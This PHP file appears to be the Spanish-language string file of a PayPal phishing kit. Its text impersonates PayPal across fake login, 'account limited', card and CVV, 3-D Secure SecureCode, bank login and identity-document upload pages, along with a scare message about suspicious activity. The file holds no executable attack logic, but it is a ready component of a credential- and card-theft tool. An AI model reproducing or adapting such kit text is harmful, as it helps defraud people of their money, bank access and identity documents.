<?php
#login
$Wiz_111 = "Ingresar a su cuenta de PayPal";
$Wiz_222 = 'que tiene problemas de conexión?';
$Wiz_333 = "Registro";
$Wiz_444 = 'Todos los derechos reservados Para PayPal Inc.';
$wiz_900 = 'Email';
$wiz_901 = 'contraseña';
$wiz_902 = 'Iniciar sesión';
#info
$Wiz_555 = 'Perfil';
$Wiz_666 = 'Modificar una foto';
$Wiz_777 = 'Hola de nuevo!';
$Wiz_888 = 'Tu cuenta de PayPal ha sido limitado!';
$Wiz_999 = 'Información necesaria';
$wiz_903 = 'Nombre de pila';
$wiz_904 = 'Apellido';
$wiz_905 = 'Dirección';
$wiz_906 = 'Ciudad';
$wiz_907 = 'Estado';
$wiz_910 = 'cremallera';
$wiz_911 = 'Número de teléfono';
#----- NAV
$Wiz_101 = 'Resumen';
$Wiz_102 = 'Actividad';
$Wiz_103 = 'Transferencia';
$Wiz_104 = 'cartera';
$Wiz_105 = 'Comprar';
$Wiz_106 = 'Salir';
$Wiz_107 = 'menú principal';
$Wiz_108 = 'Cuenta';
$Wiz_109 = "seguridad";
$Wiz_112 = 'pagos';
$Wiz_113 = 'Notificaciones';
#------ PIE DE PÁGINA
$Wiz_114 = 'AYUDA';
$Wiz_115 = "seguridad";
$Wiz_116 = 'Todos los derechos reservados.';
$Wiz_117  = 'El respeto a la vida privada';
$Wiz_118 = 'contratos de uso';
$Wiz_119 = 'Comentarios';
#------ CCV
$Wiz_120 = 'tarjeta de crédito';
$Wiz_121 = 'nombre en la tarjeta';
$Wiz_123 = 'número de la tarjeta';
$Wiz_124 = "Exp.";
$Wiz_125 = 'CVV (3-4) los números';
$Wiz_126 = 'Dirección';
$Wiz_127 = 'Confirmar';
#-------- VBV
$Wiz_128 = "Bienvenido a la verificación ™";
$Wiz_129 = "Por favor, introduzca la siguiente información para verificar su identidad.";
$Wiz_130 = "Tarjeta fecha de caducidad";
$Wiz_131 = "Código de validación ";
$Wiz_132 = "cumpleaños";
$Wiz_133 = "Contraseña o SecureCode (3d):";
$Wiz_134 = "están reservados todos los derechos.";
#-------- BANCO
$Wiz_135 = "Elija uno de estos bancos comunes";
$Wiz_136 = "seguro";
$Wiz_137 = "Tengo otro banco";
$Wiz_138 = "Es seguro para compartir que PayPal no registra ..";
$Wiz_139 = "hacer clic";
$Wiz_140 = "Continuar";
$Wiz_141 = "estoy de acuerdo con los términos y condiciones de enlace a mi cuenta bancaria.";
$Wiz_142 = "Su Banco";
$Wiz_143 = "Es seguro para compartir que PayPal no registra ..";
$Wiz_144 = "Username";
$wiz_145 = 'Contraseña';
$wiz_146 = 'Haciendo click';
$wiz_147 = 'Continuar';
$wiz_148 = 'USTED acepta los términos y condiciones para vincular mi cuenta bancaria.';
$wiz_149 = 'Tu banco';
$wiz_150 = 'Banco de nombres';
#--------Loading AND Police
$wiz_151 = 'Tratamiento';
$wiz_152 = 'Actividades sospechosas - Payapl';
$wiz_153 = 'Para ayudar a proteger su cuenta, buscamos regularmente signos tempranos de actividad potencialmente fraudulenta.';
$wiz_154 = 'Nos preocupa la posible actividad no autorizada';
$wiz_155 = 'Después de confirmar su identidad, le guiaremos en pasos para hacer su cuenta más segura.';
$wiz_156 = 'Iniciar sesión desde dispositivo desconocido';
$wiz_157 = 'Cerca de Ossining, US';
$wiz_158 = 'Sólo para estar seguros, queremos asegurarnos de que ésta sea su cuenta.';
$wiz_159 = 'Contacto';
$wiz_160 = 'Seguridad';
$wiz_161 = 'Cerrar sesión';
$wiz_162 = 'Los siguientes pasos, debe llenarlo completamente para mantener la seguridad de su cuenta y que él no es un avance';
#--------UPLOAD CART ID
$wiz_163 = 'confirme su identidad';
$wiz_164 = 'Seleccionar';
$wiz_165 = 'Cargar prueba de identidad (recomendado)';
$wiz_166 = 'Recibir un texto';
$wiz_167 = 'Recibir una llamada telefónica automatizada';
$wiz_168 = 'Error de esta opción no disponible por un momento Pruebe con otras opciones';
$wiz_169 = '¿Qué tipo de documento subirá?';
$wiz_170 = 'Mostrar requisitos de archivo';
$wiz_171 = 'Los archivos deben ser menores de 10 MB.';
$wiz_172 = 'Utilice uno de estos tipos de archivo: JPG, GIF, PNG o PDF.';
$wiz_173 = 'Suba archivos que muestren detalles actualizados y legibles.';
$wiz_174 = 'Seleccione cualquiera';
$wiz_175 = "Licencia de conducir";
$wiz_176 = 'Pasaporte';
$wiz_177 = 'ID Militar';
